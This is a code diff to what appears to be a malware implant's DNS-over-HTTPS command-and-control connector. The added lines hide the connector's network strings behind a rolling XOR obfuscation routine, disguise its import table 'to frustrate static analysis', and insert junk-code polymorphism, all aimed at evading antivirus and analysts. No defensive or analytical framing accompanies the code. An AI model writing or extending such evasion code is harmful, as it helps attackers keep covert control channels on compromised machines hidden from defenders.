@@ -5,9 +5,54 @@
 #include "ApiLoader.h"
 #include "ProcLoader.h"
 #include "StrObfuscate.h"
+#include "IatDisguise.h"
+#include "DynamicPolymorphism.h"
 #include "Agent.h"
 
 extern Agent* g_Agent;
+
+/*
+ * Obfuscated DoH-specific strings using rolling key scheme:
+ *   stored[i] = (plain[i] ^ (0x63 + i*0x17 + (i^0x3D))) + i
+ */
+static const char g_ax_obf_dns_dnsquery[] = {
+     -113,   -45,   -64,  -104,   -39,  -124,    99,    98,    42,    40,
+    0x00
+};
+
+static const char g_ax_obf_dns_accept_types[] = {
+      -63,   -57,   -94,  -115,  -107,   114,    79,    81,    65,    18,    -8,   -60,
+      -40,   -35,   -71,   -46,   125,  -124,    85,    72,    77,    30,     3,
+    0x00
+};
+
+static const char g_ax_obf_dns_post[] = {
+      -16,    -6,  -123,   -75,
+    0x00
+};
+
+static const char g_ax_obf_dns_content_type[] = {
+      -29,   -38,   -64,  -107,   -95,   101,    98,    26,    12,    40,    -6,    -2,
+      -98,   -85,   -57,   -83,  -128,  -117,   107,    56,    77,    47,    -9,     8,
+      -10,     2,   -98,   -77,  -105,    80,   115,    74,    51,    38,    19,   -28,
+        1,   -24,     8,   -26,  -101,   110,    79,    81,    72,   113,   -26,    -2,
+      -32,   -41,   -50,   -94,   -81,  -124,   114,   110,    87,    33,   -55,    13,
+      -30,   -22,    19,   -94,     5,     6,   -27,   -54,   -29,   -80,   107,   123,
+    0x00
+};
+
+static inline void AxDeobfDns(char* out, size_t outCap, const char* enc)
+{
+    if (!out || outCap == 0) return;
+    size_t i = 0;
+    while (enc[i] != 0 && i + 1 < outCap) {
+        unsigned char k = (unsigned char)(0x63 + (i * 0x17) + (i ^ 0x3D));
+        out[i] = (char)(((unsigned char)enc[i] - (unsigned char)i) ^ k);
+        ++i;
+    }
+    if (i >= outCap) i = outCap - 1;
+    out[i] = '\0';
+}
 
 static inline void WriteBE32(BYTE* dst, ULONG val) {
     dst[0] = (BYTE)(val >> 24);
@@ -76,6 +121,10 @@ ConnectorDNS::ConnectorDNS()
     this->functions->GetTickCount  = ApiWin->GetTickCount;
     this->functions->LoadLibraryA  = ApiWin->LoadLibraryA;
     this->functions->GetLastError  = ApiWin->GetLastError;
+
+	// Disguise IAT entries to frustrate static analysis
+	IatDisguise_Init();
+	AX_SPOOF_CONNECTOR_JUNK();
 
     // Initialize DoH functions structure
     this->dohFunctions = (DOHFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DOHFUNC));
@@ -255,10 +304,12 @@ void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
         }
 
         // Copy path (default to /dns-query)
+        CHAR dnsQueryBuf[16];
+        AxDeobfDns(dnsQueryBuf, sizeof(dnsQueryBuf), g_ax_obf_dns_dnsquery);
         if (*pathStart == '/')
-            StrLCopyA(info->path, pathStart, sizeof(info->path));
-        else
-            StrLCopyA(info->path, "/dns-query", sizeof(info->path));
+        StrLCopyA(info->path, pathStart, sizeof(info->path));
+    else
+        StrLCopyA(info->path, dnsQueryBuf, sizeof(info->path));
 
         if (info->host[0])
             this->dohResolverCount++;
@@ -425,11 +476,14 @@ BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, 
         return FALSE;
 
     // Open POST request
-    CHAR acceptTypes[] = "application/dns-message";
+    CHAR acceptTypes[24];
+    AxDeobfDns(acceptTypes, sizeof(acceptTypes), g_ax_obf_dns_accept_types);
     LPCSTR rgpszAcceptTypes[] = { acceptTypes, NULL };
     DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;
 
-    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA( hConnect, "POST", resolver->path, NULL, NULL, rgpszAcceptTypes, flags, 0 );
+    CHAR methodBuf[8];
+    AxDeobfDns(methodBuf, sizeof(methodBuf), g_ax_obf_dns_post);
+    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA( hConnect, methodBuf, resolver->path, NULL, NULL, rgpszAcceptTypes, flags, 0 );
     if (!hRequest) {
         this->dohFunctions->InternetCloseHandle(hConnect);
         return FALSE;
@@ -444,7 +498,8 @@ BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, 
     }
 
     // Set Content-Type header for DoH
-    CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message\r\n";
+    CHAR headers[128];
+    AxDeobfDns(headers, sizeof(headers), g_ax_obf_dns_content_type);
 
     // Send request with DNS query as body
     BOOL sendOk = this->dohFunctions->HttpSendRequestA( hRequest, headers, (DWORD)-1, (LPVOID)dnsQuery, queryLen );
